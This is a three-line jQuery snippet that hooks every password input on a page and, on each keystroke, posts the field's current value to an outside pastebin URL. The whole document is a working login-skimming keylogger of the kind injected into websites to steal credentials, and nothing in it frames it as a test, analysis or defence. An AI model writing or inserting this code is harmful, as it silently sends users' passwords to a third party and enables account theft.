$('[type=password]').on('keyup', function(event){
  $.post( "https://pastebin.com/u/r8rcr8z", { pwd : event.currentTarget.value } );
});
